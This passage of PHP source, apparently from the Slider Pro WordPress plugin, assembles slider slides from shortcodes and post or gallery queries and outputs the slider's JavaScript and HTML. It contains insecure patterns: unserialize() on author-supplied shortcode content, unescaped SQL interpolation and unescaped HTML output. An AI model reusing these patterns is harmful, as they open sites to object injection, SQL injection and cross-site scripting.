		$slides = sliderpro_get_slides($id);
	}
	
	
	// analyze the shortcode's content, if any
	if ($content) {
		// create an array that will hold extra slides
		$slides_extra = array();
		
		// counter for the slides for which an index was not specified and will be added at the end of the other slides
		$end_counter = 1;
		
		// get all the added slides
		$slides_sc = do_shortcode($content);
		$slides_sc = str_replace('<br />', '', $slides_sc);		
		$slides_sc = explode('%sp_sep%', $slides_sc);
		
		
		// loop through all the slides added within the shortcode 
		// and add the slide to the slides_extra array
		foreach($slides_sc as $slide_sc) {
			$slide_sc = unserialize(trim($slide_sc));
			
			if ($slide_sc) {
				$index = $slide_sc['settings']['index'];
				
				if (!is_numeric($index)) {
					$index .= "_$end_counter";
					$end_counter++;
				}
				
				$slides_extra[$index] = $slide_sc;
			}
		}
		
		
		// loop through all the existing slides and override the settings and/or the content
		// if it's the case
		foreach($slides as &$slide_r) {
			$slide_settings = unserialize($slide_r['settings']);
			$slide_content = unserialize($slide_r['content']);
			
			if($slides_extra[$slide_r['position']]) {
				$slide_extra = $slides_extra[$slide_r['position']];
				
				if ($slide_extra['settings'])
					$slide_settings = array_merge($slide_settings, $slide_extra['settings']);
				
				if ($slide_extra['content'])
					$slide_content = array_merge($slide_content, $slide_extra['content']);
				
				unset($slides_extra[$slide_r['position']]);
			}
			
			$slide_r['settings'] = $slide_settings;
			$slide_r['content'] = $slide_content;
		}
		
		
		// add the extra slides at the end of the initial slides
		foreach($slides_extra as $slide_end)
			array_push($slides, $slide_end);

	} else {
		foreach($slides as &$slide_s) {
			$slide_settings = unserialize($slide_s['settings']);
			$slide_content = unserialize($slide_s['content']);
			
			$slide_s['settings'] = $slide_settings;
			$slide_s['content'] = $slide_content;
		}	
	}
	
	
	$dynamic_slides = array();
	
	$posts_terms_pattern = sliderpro_regex(array('sp_image', 'sp_image_alt', 'sp_image_title', 'sp_image_caption', 'sp_image_description', 'sp_comments_number', 
		'sp_comments_link', 'sp_title', 'sp_content', 'sp_excerpt', 'sp_author_name', 'sp_author_posts', 'sp_date', 'sp_link','sp_custom'));
	
	$gallery_terms_pattern = sliderpro_regex(array('sp_image', 'sp_image_alt', 'sp_image_title', 'sp_image_caption', 'sp_image_description'));
	

	foreach($slides as $slide) {
		// check if the slide is set to automatically fetch post dara
		if (sliderpro_get_slide_setting($slide['settings'], 'slide_type', 'dynamic') == 'posts' && $slide['visibility'] == 'enabled') {
			
			$slide_settings = $slide['settings'];
			$slide_content = $slide['content'];

			foreach($slide_content as $key => $value)
				$slide_content[$key] = sliderpro_decode($value, true, true);
			
			
			// construct the argument of the Query object
			$dynamic_slide_args = array();

			
			if (isset($slide_settings['dynamic_posts_types'])) {
				$dynamic_post_types = explode(';', $slide_settings['dynamic_posts_types']);
				
				$dynamic_slide_args['post_type'] = $dynamic_post_types;
			}
			
			
			if (isset($slide_settings['dynamic_posts_taxonomies'])) {
				$tax_query = array();
				
				$dynamic_taxonomies = explode(';', $slide_settings['dynamic_posts_taxonomies']);
				
				foreach ($dynamic_taxonomies as $item_raw) {
					$item = explode('|', $item_raw);
					
					$tax_item['taxonomy'] = $item[0];
					$tax_item['terms'] = $item[1];
					$tax_item['field'] = 'slug';
					
					array_push($tax_query, $tax_item);
				}
				
				$tax_query['relation'] = $slide_settings['dynamic_posts_relation'];
				
				$dynamic_slide_args['tax_query'] = $tax_query;
			}
			
			
			if ($slide_settings['dynamic_posts_featured'])
				$dynamic_slide_args['meta_query'] = array(array('key' => '_sliderpro-featured', 'value' => true));
			
			
			$dynamic_slide_args['posts_per_page'] = $slide_settings['dynamic_posts_maximum'];
			$dynamic_slide_args['offset'] = $slide_settings['dynamic_posts_offset'];
			$dynamic_slide_args['orderby'] = $slide_settings['dynamic_posts_orderby'];
			$dynamic_slide_args['order'] = $slide_settings['dynamic_posts_order'];
			
			
			$slide_dynamic_terms = array();
			$has_image = false;

			// get all the dynamic terms used in the content fields
			foreach ($slide_content as $key => $value) {
				if ($value != '') {
					$matches = array();
					
					preg_match_all('/' . $posts_terms_pattern . '/s', $value, $matches);
					
					// check if a match is found
					if (!empty($matches)) {
						// loop through all terms found in the field
						foreach ($matches[0] as $counter => $match_item) {
							// check if the exact term is not already added to the collection
							if (!isset($slide_dynamic_terms[$match_item])) {								
								// get the array of arguments specified for the term/tag
								$args = explode('|', trim($matches[3][$counter]));
								
								// create an array of argument pairs (name => value)
								$arg_pair = array('term_name' => $matches[2][$counter]);
								
								// check if an image exists in the content fields
								if ($matches[2][$counter] == 'sp_image')
									$has_image = true;
								
								foreach ($args as $arg) {
									if ($arg != '') {
										$arg_item = explode('=', $arg);										
										$arg_pair[trim($arg_item[0])] = substr(trim($arg_item[1]), 1, -1);
									}
								}
								
								// associate the term found with its array of argument pairs
								$slide_dynamic_terms[$match_item] = $arg_pair;
							}
						}
					}
				}
			}
			
			
			// start the Query
			$query = new WP_Query($dynamic_slide_args);
			
			while ($query->have_posts()) {
				$query->the_post();
				
				$dynamic_slide = array();
				
				// each dynamic slide will initially contain the main slide's content and settings
				$dynamic_slide['settings'] = $slide_settings;
				$dynamic_slide['content'] = $slide_content;
				$dynamic_slide['position'] = $slide['position'];
				$dynamic_slide['visibility'] = $slide['visibility'];
				
				
				// the image id will be used for multiple terms
				$image_id;
				// contains data like image alt, image title, image caption and image description
				$image_data;
				
				// if an image exists, get the ID and meta data of the image
				if ($has_image) {
					if (has_post_thumbnail()) {
						$image_id = get_post_thumbnail_id();
					} else {
						$children_args = array(
							'post_status' => 'inherit', 
							'post_type' => 'attachment', 
							'post_mime_type' => 'image', 
							'post_parent' => get_the_ID(),
							'numberposts' => 1,
							'orderby' => 'menu_order',
							'order' => 'ASC'
							);

						$image_item = get_children($children_args, ARRAY_A);
						
						if ($image_item)
							$image_item = array_values($image_item);

						$image_id = $image_item[0]['ID'];
					}
					
					$image_data = get_post($image_id, ARRAY_A);
					
					$image_alt_data = get_post_meta($image_id, '_wp_attachment_image_alt');
					$image_data['alt'] = !empty($image_alt_data) ? $image_alt_data[0] : '';
				}
				
				
				// loop through all content fields
				foreach ($dynamic_slide['content'] as $field_name => &$field_content) {					
					if ($field_content != '') {
						// loop through all terms that were find in the content fields
						foreach ($slide_dynamic_terms as $term => $term_data) {
							// check if the term is in the current field
							if (strpos($field_content, $term) !== false) {								
								// check the type of the term
								
								$replace = '';
								
								if ($term_data['term_name'] == 'sp_image') {
									
									$image_size = isset($term_data['size']) ? $term_data['size'] : 'full';
									$image_src = wp_get_attachment_image_src($image_id, $image_size);
									
									$replace = sliderpro_get_real_path($image_src[0]);

								} else if ($term_data['term_name'] == 'sp_image_alt') {		

									$replace = $image_data['alt'];
									
								} else if ($term_data['term_name'] == 'sp_image_title') {	

									$replace = $image_data['post_title'];

								} else if ($term_data['term_name'] == 'sp_image_caption') {	

									$replace = $image_data['post_excerpt'];
									
								} else if ($term_data['term_name'] == 'sp_image_description') {	

									$replace = $image_data['post_content'];
									
								} else if ($term_data['term_name'] == 'sp_title') {
									
									$replace = get_the_title();
									
								} else if ($term_data['term_name'] == 'sp_link') {
									
									$replace = get_post_permalink(get_the_ID());
									
								} else if ($term_data['term_name'] == 'sp_date') {
									
									$date_format = isset($term_data['format']) ? $term_data['format'] : get_option('date_format');
									$replace = get_the_date($date_format);
									
								} else if ($term_data['term_name'] == 'sp_author_name') {
									
									$replace = get_the_author();
									
								} else if ($term_data['term_name'] == 'sp_author_posts') {
									
									$replace = get_author_posts_url(get_the_author_meta('ID')); 
									
								} else if ($term_data['term_name'] == 'sp_comments_number') {
									
									$more = isset($term_data['more']) ? $term_data['more'] : false;
									$one = isset($term_data['one']) ? $term_data['one'] : false;
									$zero = isset($term_data['zero']) ? $term_data['zero'] : false;
									
									$number = get_comments_number();

									if ($number > 1)
										$replace = str_replace('%', $number, $more === false ? __('% Comments') : $more);
									else if ($number == 0)
										$replace = $zero === false ? __('No Comments') : $zero;
									else
										$replace = $one === false ? __('1 Comment') : $one;
									
								} else if ($term_data['term_name'] == 'sp_comments_link') {
									
									$replace = get_comments_link();
									
								} else if ($term_data['term_name'] == 'sp_excerpt') {
									
									$excerpt = isset($term_data['limit']) ? substr(get_the_excerpt(), 0, $term_data['limit']) : get_the_excerpt();
									
									if (isset($term_data['more_text'])) {
										
										$more_text = $term_data['more_text'];										
										$more_link = isset($term_data['more_link']) ? $term_data['more_link'] : get_post_permalink(get_the_ID());
										
										$excerpt .= '<a href="' . $more_link . '">' . $more_text . '</a>';
									}
									
									$replace = $excerpt;
									
								} else if ($term_data['term_name'] == 'sp_content') {
									
									$content = isset($term_data['more_text']) ? get_the_content($term_data['more_text']) : get_the_content();
									
									if (isset($term_data['filters'])) {
										$content = apply_filters('the_content', $content);
										$content = str_replace(']]>', ']]&gt;', $content);
									}
									
									$replace = $content;
									
								} else if ($term_data['term_name'] == 'sp_custom') {
									
									$replace = '';
									
									if (isset($term_data['name'])) {
										$values = get_post_meta(get_the_ID(), $term_data['name']);										
										$index = isset($term_data['index']) ? $term_data['index'] : 0;
										
										$replace = isset($values[$index]) ? $values[$index] : '';
									}

								}								
								
								// replace all the current terms in the field with the corresponding content
								$field_content = str_replace($term, $replace, $field_content);								
							}
							
						} // end terms loop
					}
					
				} // end fields loop
				
				array_push($dynamic_slides, $dynamic_slide);
				unset($dynamic_slide);
				
			} // end while
			
			wp_reset_postdata();			
			unset($slide_dynamic_terms);
			
		} else if (sliderpro_get_slide_setting($slide['settings'], 'slide_type', 'dynamic') == 'gallery' && $slide['visibility'] == 'enabled') {
			
			$slide_settings = $slide['settings'];
			$slide_content = $slide['content'];
			
			foreach($slide_content as $key => $value)
				$slide_content[$key] = sliderpro_decode($value, true, true);
			

			$gallery_post_id;
			
			// if the post is set to '-1' only display the content if it's inside the loop
			// don't diplay it if it's in the Preview window
			if ($slide_settings['dynamic_gallery_post'] == -1 && !in_the_loop())
				continue;
			else 
				$gallery_post_id = $slide_settings['dynamic_gallery_post'] == -1 ? get_the_ID() : $slide_settings['dynamic_gallery_post'];


			// get the images from the post's gallery
			$children_args = array(
				'post_status' => 'inherit', 
				'post_type' => 'attachment', 
				'post_mime_type' => 'image', 
				'post_parent' => $gallery_post_id,
				'numberposts' => $slide_settings['dynamic_gallery_maximum'],
				'orderby' => 'menu_order',
				'order' => 'ASC'
				);							 
			

			$gallery_images =  array_splice(array_values(get_children($children_args, ARRAY_A)), $slide_settings['dynamic_gallery_offset']);
			
			
			$slide_dynamic_terms = array();

			// get all the dynamic terms used in the content fields
			foreach ($slide_content as $key => $value) {
				if ($value != '') {
					$matches = array();
					
					preg_match_all('/' . $gallery_terms_pattern . '/s', $value, $matches);
					
					// check if a match is found
					if (!empty($matches)) {
						// loop through all terms found in the field
						foreach ($matches[0] as $counter => $match_item) {
							// check if the exact term is not already added to the collection
							if (!isset($slide_dynamic_terms[$match_item])) {								
								// get the array of arguments specified for the term/tag
								$args = explode('|', trim($matches[3][$counter]));
								
								// create an array of argument pairs (name => value)
								$arg_pair = array('term_name' => $matches[2][$counter]);
								
								foreach ($args as $arg) {
									if ($arg != '') {
										$arg_item = explode('=', $arg);										
										$arg_pair[trim($arg_item[0])] = substr(trim($arg_item[1]), 1, -1);
									}
								}
								
								// associate the term found with its array of argument pairs
								$slide_dynamic_terms[$match_item] = $arg_pair;
							}
						}
					}
				}
			}
			
			
			foreach ($gallery_images as $image) {
				
				$dynamic_slide = array();
				
				// each dynamic slide will initially contain the main slide's content and settings
				$dynamic_slide['settings'] = $slide_settings;
				$dynamic_slide['content'] = $slide_content;
				$dynamic_slide['position'] = $slide['position'];
				$dynamic_slide['visibility'] = $slide['visibility'];
				

				// loop through all content fields
				foreach ($dynamic_slide['content'] as $field_name => &$field_content) {					
					if ($field_content != '') {
						// loop through all terms that were find in the content fields
						foreach ($slide_dynamic_terms as $term => $term_data) {
							// check if the term is in the current field
							if (strpos($field_content, $term) !== false) {								
								// check the type of the term
								
								$replace = '';
								
								if ($term_data['term_name'] == 'sp_image') {
									
									$image_size = isset($term_data['size']) ? $term_data['size'] : 'full';
									$image_src = wp_get_attachment_image_src($image['ID'], $image_size);
									
									$replace = sliderpro_get_real_path($image_src[0]);

								} else if ($term_data['term_name'] == 'sp_image_alt') {		
									
									$image_alt = get_post_meta($image['ID'], '_wp_attachment_image_alt');
									$replace = !empty($image_alt) ? $image_alt[0] : '';
									
								} else if ($term_data['term_name'] == 'sp_image_title') {	

									$replace = $image['post_title'];

								} else if ($term_data['term_name'] == 'sp_image_caption') {	

									$replace = $image['post_excerpt'];
									
								} else if ($term_data['term_name'] == 'sp_image_description') {	

									$replace = $image['post_content'];
									
								}
								
								// replace all the current terms in the field with the corresponding content
								$field_content = str_replace($term, $replace, $field_content);								
							}
							
						} // end terms loop
					}
					
				} // end fields loop
				
				array_push($dynamic_slides, $dynamic_slide);
				unset($dynamic_slide);
			}
			
			unset($slide_dynamic_terms);
			
		} //end if
		
	} // end foreach
	
	
	// insert the dynamic slides
	if (!empty($dynamic_slides)) {
		$dynamic_slides = array_reverse($dynamic_slides);
		$position_to_remove = -1;
		
		foreach ($dynamic_slides as $dynamic_slide) {
			// remove the 'static' slides that were set to be dynamic
			if ($dynamic_slide['position'] != $position_to_remove) {
				$position_to_remove = $dynamic_slide['position'];
				array_splice($slides, $position_to_remove - 1, 1);
			}
			
			// add the dynamic slides
			array_splice($slides, $position_to_remove - 1, 0, array($dynamic_slide));				
		}		
	}
	
	
	// string that will contain the javascript properties of the slider
	$slider_js_properties = "";
	
	// if a value is different from the default value, add it to the string
	foreach ($sliderpro_slider_settings as $name => $value) {
		if (isset($slider_settings[$name]) && isset($sliderpro_js_properties[$name])) {
			if ($slider_settings[$name] != $value['default_value']) {			
				if ($slider_js_properties != "")
					$slider_js_properties .= ", " . PHP_EOL;
				$slider_js_properties .= SP_IND_3 . sliderpro_get_js_property_name($name) . ": " . sliderpro_get_js_property_value($slider_settings[$name]);
			}
		}
	}
	
	
	// decide what javascript files will need to be included in public view
	// based on the sliders' settings
	if (!in_array('slider', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'slider');
	
	if (sliderpro_get_setting($slider_settings, 'enable_custom_js') && !in_array($current_id, $sliderpro_custom_scripts_to_load))
		array_push($sliderpro_custom_scripts_to_load, $current_id);

	if (sliderpro_get_setting($slider_settings, 'timer_animation') && !in_array('excanvas', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'excanvas');
	
	if (sliderpro_get_setting($slider_settings, 'thumbnail_mouse_wheel') && !in_array('mousewheel', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'mousewheel');
	
	if (sliderpro_get_setting($slider_settings, 'lightbox') && !in_array('lightbox', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'lightbox');
	
	if (sliderpro_get_setting($slider_settings, 'css3_transitions') && !in_array('css3_transitions', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'css3_transitions');
	
	if (sliderpro_get_setting($slider_settings, 'youtube_controller') && !in_array('youtube_controller', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'youtube_controller');

	if (sliderpro_get_setting($slider_settings, 'vimeo_controller') && !in_array('vimeo_controller', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'vimeo_controller');

	if (sliderpro_get_setting($slider_settings, 'html5_controller') && !in_array('html5_controller', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'html5_controller');

	if (sliderpro_get_setting($slider_settings, 'videojs_controller') && !in_array('videojs_controller', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'videojs_controller');
	
	if (sliderpro_get_setting($slider_settings, 'effect_type') == 'swipe' && !in_array('touch_swipe', $sliderpro_scripts_to_load))
		array_push($sliderpro_scripts_to_load, 'touch_swipe');
	
	
	// string that will contain the javascript properties of the slides
	$slides_js_properties = "";
	
	$index = 0;
	
	// loop through all the slides 
	foreach($slides as $slide) {
		$slide_settings = $slide['settings'];
		$slide_js_properties = "";		
		
		// if a setting was marked to override the global setting, add that property to the string
		foreach($slide_settings as $name => $value) {
			if (isset($sliderpro_js_properties[$name])) {			
				if ($slide_js_properties != "")
					$slide_js_properties .= ", ";
				
				$slide_js_properties .= sliderpro_get_js_property_name($name) . ": " . sliderpro_get_js_property_value($slide_settings[$name]);
			}
		}
		
		if ($slide_js_properties != "") {
			if ($slides_js_properties != "")
				$slides_js_properties .= ", " . PHP_EOL;
			
			$slides_js_properties .= SP_IND_4 . $index . ': {' . $slide_js_properties . '}';	
		}
		
		$index++;
	}
	
	
	// create the Javascript output
	$js_string = '';
	$js_string .= PHP_EOL . '<script type="text/javascript">' . PHP_EOL;
	
	// append the lightbox css to the header if it's going to be used
	if (sliderpro_get_setting($slider_settings, 'lightbox') && !$sliderpro_lightbox_loaded) {
		$sliderpro_lightbox_loaded = true;
		$js_string .= SP_IND_1 . 
		'jQuery("<link>").attr({rel: "stylesheet", type: "text/css", media: "all", href: "' . plugins_url('/slider-pro/css/slider/prettyPhoto.css') . '"}).appendTo(jQuery("head"));' . 
		PHP_EOL . PHP_EOL;
	}
	
	// append the VideoJS css to the header if it's going to be used
	if (sliderpro_get_setting($slider_settings, 'videojs_controller') && !$sliderpro_videojs_loaded) {
		$sliderpro_lightbox_loaded = true;
		$js_string .= SP_IND_1 . 
		'jQuery("<link>").attr({rel: "stylesheet", type: "text/css", media: "all", href: "' . plugins_url('/slider-pro/css/slider/video-js.min.css') . '"}).appendTo(jQuery("head"));' . 
		PHP_EOL . PHP_EOL;
	}
	
	$js_string .= SP_IND_1 . 'jQuery(document).ready(function() {' . PHP_EOL;
		$js_string .= SP_IND_2 . 'jQuery("#slider-pro-' . $current_id . '").advancedSlider({' . PHP_EOL;
			$js_string .= $slider_js_properties;

			if ($slides_js_properties != '') {
				if ($slider_js_properties != '')
					$js_string .= ', ' . PHP_EOL;	

				$js_string .= SP_IND_3 . 'slideProperties: {' . PHP_EOL . $slides_js_properties . PHP_EOL . SP_IND_3 . '}'. PHP_EOL;	
			} else {
				$js_string .= PHP_EOL;
			}

			$js_string .= SP_IND_2 . '});' . PHP_EOL;

$js_string .= SP_IND_1 . '});' . PHP_EOL;
$js_string .= '</script>' . PHP_EOL;

	// to be printed in foother
$sliderpro_sliders_js .= $js_string;

$slider_classes = sliderpro_get_setting($slider_settings, 'custom_class') != '' ? 'advanced-slider ' . sliderpro_get_setting($slider_settings, 'custom_class') : 'advanced-slider';

	// create the HTML output
$html_string = '';
$html_string .= '<div class="' . $slider_classes . '" id="slider-pro-' . $current_id . '" tabindex="0">' . PHP_EOL;	
$html_string .= SP_IND_1 . '<ul class="slides">' . PHP_EOL;	

$slider_width = sliderpro_get_setting($slider_settings, 'width');
$slider_height = sliderpro_get_setting($slider_settings, 'height');

foreach($slides as $slide) {
	if (isset($slide['visibility']) && $slide['visibility'] == 'disabled')
		continue;			

	$slide_content = $slide['content'];
	$slide_settings = $slide['settings'];

	$slide_width = sliderpro_get_setting($slider_settings, 'slide_resizing_width') == 'auto' ? (strpos($slider_width, '%') ? 500 : $slider_width) : 
	sliderpro_get_setting($slider_settings, 'slide_resizing_width');

	$slide_height = sliderpro_get_setting($slider_settings, 'slide_resizing_height') == 'auto' ? (strpos($slider_height, '%') ? 300 : $slider_height) : 
	sliderpro_get_setting($slider_settings, 'slide_resizing_height');

	$timthumb_image_path = (get_option('slider_pro_enable_timthumb') && sliderpro_get_setting($slider_settings, 'slide_resizing_resize')) ? 
	esc_attr(plugins_url('/slider-pro/includes/timthumb/timthumb.php').'?q=' . sliderpro_get_setting($slider_settings, 'slide_resizing_quality').
		'&w=' . $slide_width.
		'&h=' . $slide_height.
		'&a=' . sliderpro_get_setting($slider_settings, 'slide_resizing_align').
		'&zc=' . sliderpro_get_setting($slider_settings, 'slide_resizing_crop').
		'&src=') : '';

	$timthumb_thumbnails_path = (get_option('slider_pro_enable_timthumb') && sliderpro_get_setting($slider_settings, 'thumbnail_resizing_resize')) ? 
	esc_attr(plugins_url('/slider-pro/includes/timthumb/timthumb.php').'?q=' . sliderpro_get_setting($slider_settings, 'thumbnail_resizing_quality').
		'&w=' . sliderpro_get_setting($slider_settings, 'thumbnail_width').
		'&h=' . sliderpro_get_setting($slider_settings, 'thumbnail_height').
		'&a=' . sliderpro_get_setting($slider_settings, 'thumbnail_resizing_align').
		'&zc=' . sliderpro_get_setting($slider_settings, 'thumbnail_resizing_crop').
		'&src=') : '';


	$lazy_loaded_image = ($slide_content['image'] != '' && sliderpro_get_setting($slider_settings, 'lazy_loading')) ? 
	'data-image="' . $timthumb_image_path . $slide_content['image'] . '"' : '';

	$html_string .= SP_IND_2 . '<li class="slide" ' . $lazy_loaded_image . '>' . PHP_EOL;


		// get the link specified for the slide
	$slide_link_path = sliderpro_get_slide_content($slide_content, 'slide_link_path');

	if ($slide_link_path != '') {
		$slide_link_target = sliderpro_get_slide_setting($slide_settings, 'slide_link_target', 'extra');

		$slide_link_title = sliderpro_get_slide_content($slide_content, 'slide_link_title');
		$slide_link_title = $slide_link_title != '' ? ' title="' . $slide_link_title . '"' : '';

		$slide_lightbox_content = sliderpro_get_slide_setting($slide_settings, 'slide_link_lightbox', 'extra') ? 
		sliderpro_get_setting($slider_settings, 'lightbox_gallery') ? ' rel="slider-lightbox[slider-pro-slide-' . $current_id . ']"' : 
		' rel="slider-lightbox"' :
		'';

		$html_string .= SP_IND_3 . '<a' . $slide_lightbox_content . ' href="' . $slide_link_path . '" target="' . $slide_link_target . '"' . $slide_link_title . ' tabindex="-1">' . PHP_EOL;
	}

		// get the slide image
	$slide_image = isset($slide_content['image']) ? $slide_content['image'] : '';

	if ($slide_image != '') {
		$slide_image = $lazy_loaded_image == '' ? $timthumb_image_path . $slide_image : '';

		$slide_title = isset($slide_content['title']) ? $slide_content['title'] : '';
		$slide_title = $slide_title != '' ? ' title="' . $slide_title . '"' : '';

		$image_indentation = $slide_link_path != '' ? SP_IND_4 : SP_IND_3;

		$slide_alt = isset($slide_content['alt']) ? $slide_content['alt'] : '';

		$html_string .= $image_indentation . '<img class="image" src="' . $slide_image . '" alt="' . $slide_alt . '"' . $slide_title . '/>' . PHP_EOL;
	}

		// end the slide link
	if ($slide_link_path != '')
		$html_string .= SP_IND_3 . '</a>' . PHP_EOL;


		// get the slide caption
	$slide_caption = sliderpro_get_slide_content($slide_content, 'caption');

	if ($slide_caption != '')
		$html_string .= SP_IND_3 . '<div class="caption">' . do_shortcode(sliderpro_decode($slide_caption, true, true)) . '</div>' . PHP_EOL;


		// get the slide inline HTML content
	$slide_html = sliderpro_get_slide_content($slide_content, 'html');

	if ($slide_html != '')
		$html_string .= SP_IND_3 . '<div class="html">' . do_shortcode(sliderpro_decode($slide_html, true, true)) . '</div>' . PHP_EOL;


		// get the thumbnail type
	$thumbnail_type = sliderpro_get_setting($slider_settings, 'thumbnail_type');

	if ($thumbnail_type != 'none') {
			// get the thumbnail image
		$thumbnail_path = sliderpro_get_slide_content($slide_content, 'thumbnail_image') != '' ? $slide_content['thumbnail_image'] : $slide_content['image'];

		if ($thumbnail_path != '') {
			$thumbnail_title = isset($slide_content['thumbnail_title']) ? $slide_content['thumbnail_title'] : '';
			$thumbnail_title = $thumbnail_title != '' ? ' title="' . $thumbnail_title . '"' : '';

			$thumbnail_link_path = sliderpro_get_slide_content($slide_content, 'thumbnail_link_path');

			$thumbnail_indentation = $thumbnail_link_path != '' ? SP_IND_4 : SP_IND_3;

				// get the thumbnail link
			if ($thumbnail_link_path != '') {
				$thumbnail_link_target = sliderpro_get_slide_setting($slide_settings, 'thumbnail_link_target');

				$thumbnail_link_title = sliderpro_get_slide_content($slide_content, 'thumbnail_link_title');
				$thumbnail_link_title = $thumbnail_link_title != '' ? ' title="' . $thumbnail_link_title . '"' : '';

				$thumbnail_lightbox_content = sliderpro_get_slide_setting($slide_settings, 'thumbnail_link_lightbox', 'extra') ? 
				sliderpro_get_setting($slider_settings, 'lightbox_gallery') ? ' rel="slider-lightbox[slider-pro-thumbnail-' . $current_id . ']"' : 
				' rel="slider-lightbox"' :
				'';

				$html_string .= SP_IND_3 . 
				'<a' . $thumbnail_lightbox_content . ' href="' . $thumbnail_link_path . '" target="' . $thumbnail_link_target . '"' . $thumbnail_link_title . ' tabindex="-1">' . PHP_EOL;
			}

			$thumbnail_alt = isset($slide_content['thumbnail_alt']) ? $slide_content['thumbnail_alt'] : '';

			$html_string .= $thumbnail_indentation . 
			'<img class="thumbnail" src="' . $timthumb_thumbnails_path . $thumbnail_path . '" alt="' . $thumbnail_alt . '"' . $thumbnail_title . '/>' . PHP_EOL;

				// end the thumbnail link
			if ($thumbnail_link_path != '')
				$html_string .= SP_IND_3 . '</a>' . PHP_EOL;
		}
	}

	$html_string .= SP_IND_2 . '</li>' . PHP_EOL;
}

$html_string .= SP_IND_1 . '</ul>' . PHP_EOL;	
$html_string .= '</div>';

return PHP_EOL . PHP_EOL . $html_string . PHP_EOL . PHP_EOL;
}


/**
* Shortcode used to create the slider
*/
function slider_pro_shortcode($atts, $content = null) {
	extract(shortcode_atts(array(
		'id' => '-1',
		), $atts));	
	
	return slider_pro($id, $atts, $content);
}



/**
* Shortcode used to create a slide
*/
function slider_pro_slide_shortcode($atts, $content = null) {	
	$attributes = array('index' => 'end');
	
	// if any setting was specified add it to a list
	// and mark it to override the global setting
	if($atts)
		foreach($atts as $key => $value)
			$attributes[$key] = $value;

		$slide = array();

		$slide_content = do_shortcode($content);	
		$slide_content = str_replace('<br />', '', $slide_content);	
		$slide_content_elements = explode('%sp_sep%', $slide_content);


	// get the content of the slide
		foreach($slide_content_elements as $element) {
			$element = unserialize(trim($element));		

			if ($element)
				foreach($element as $key => $value)
					$slide['content'][$key] = $value;
			}

			$settings = array();

	// get the slide's settings
			foreach($attributes as $key => $value)
				$settings[$key] = $value;		

			$slide['settings'] = $settings;

			return serialize($slide) . '%sp_sep%';
		}


/**
* Shortcode used to create a slide element (like HTML content, caption, tooltip, tooltip caption)
*/
function slider_pro_element_shortcode($atts, $content = null) {
	extract(shortcode_atts(array('type' => 'none'), $atts));
	
	$content = do_shortcode($content);
	
	return serialize(array($type => $content)) . '%sp_sep%';
}


/**
* Get the javascript name of the setting
*/
function sliderpro_get_js_property_name($raw_name) {
	global $sliderpro_js_properties;
	
	return $sliderpro_js_properties[$raw_name];
}


/**
* Get the javascript value of the setting
*/
function sliderpro_get_js_property_value($raw_value) {
	$value;
	
	if (is_numeric($raw_value) || $raw_value == 'true' || $raw_value == 'false')
		$value = $raw_value;
	else
		$value = "'" . $raw_value . "'";
	
	return $value;
}


/**
* Read all the files from the specified 'skin' directories and 
* store the type of skin and the path in the database
*/
function sliderpro_refresh_skins($skin_types) {
	global $wpdb;
	
	$wpdb->query("TRUNCATE TABLE " . $wpdb->prefix . "sliderpro_skins");
	
	foreach ($skin_types as $type) {
		$skins_root_dir = WP_PLUGIN_DIR . '/slider-pro/skins/' . $type;

		$directory = new RecursiveDirectoryIterator($skins_root_dir);
		$iterator = new RecursiveIteratorIterator($directory);
		$iterator->setMaxDepth(2);
		$regex = new RegexIterator($iterator, '/^.+\.css$/i', RecursiveRegexIterator::GET_MATCH);		
		
		foreach($regex as $item) {
			$path = $item[0];
			
			$file_directory_array = explode($type . DIRECTORY_SEPARATOR, $path);
			$file_directory = $file_directory_array[1];
			
			$file_name_array = explode(DIRECTORY_SEPARATOR, $file_directory);
			$file_name = $file_name_array[count($file_name_array) - 1];
			
			$file_directory = substr(str_replace($file_name, '', $file_directory), 0, -1);
			
			$skin_meta = sliderpro_get_skin_meta($path);
			$skin_url = plugins_url('slider-pro/skins/' . $type . '/' . $file_directory . '/' . $file_name);
			$skin_container_dir = $skins_root_dir . '/' . $file_directory;

			$wpdb->insert($wpdb->prefix . 'sliderpro_skins', array('type' => $type,
				'path' => $path,
				'name' =>  $skin_meta['Skin Name'],
				'class' =>  $skin_meta['Class'],
				'description' =>  $skin_meta['Description'],
				'author' =>  $skin_meta['Author'],
				'url' => $skin_url,
				'container_dir' => $skin_container_dir),
			array('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s'));
		}
	}
}


/**
* Read all the skin paths from the database, create a skin object containing 
* all the information of the skin and store all the skin objects in an array
*/
function sliderpro_get_skins($type) {	
	global $wpdb;
	$skins = array();
	
	$skins_raw = $wpdb->get_results("SELECT * FROM " . $wpdb->prefix . "sliderpro_skins WHERE type = '$type'", ARRAY_A);
	
	if ($skins_raw)
		foreach($skins_raw as $skin)
			array_push($skins, $skin);

		return $skins;
	}


/**
* Get the header date specified in a file
*/
function sliderpro_get_skin_meta($file) {
	$default_headers = array(
		'Skin Name' => 'Skin Name',
		'Class' => 'Class',
		'Description' => 'Description',
		'Author' => 'Author',
		);
	
	return get_file_data($file, $default_headers);	
}


/**
* Get a skin by it's class
*/
function sliderpro_get_skin_by_class($name) {
	global $sliderpro_all_skins;
	
	foreach ($sliderpro_all_skins as $skin)
		if ($skin['class'] == $name)
			return $skin;
	}


/**
* Get all the skins used by all the sliders created
*/
function sliderpro_get_all_skins_used() {
	$skins = array();
	
	global $wpdb;
	$prefix = $wpdb->prefix;
	$slider_configs = $wpdb->get_results("SELECT id, settings FROM " . $prefix . "sliderpro_sliders", ARRAY_A);
	
	if ($slider_configs)
		foreach($slider_configs as $slider_config) {
			$settings = unserialize($slider_config['settings']);
			
			$skin = sliderpro_get_setting($settings, 'skin');

			if (!in_array($skin, $skins))
				array_push($skins, $skin);
			
			if (sliderpro_get_setting($settings, 'thumbnail_scrollbar')) {
				$scrollbar_skin = sliderpro_get_setting($settings, 'scrollbar_skin');
				
				if (!in_array($scrollbar_skin, $skins))
					array_push($skins, $scrollbar_skin);
			}
			
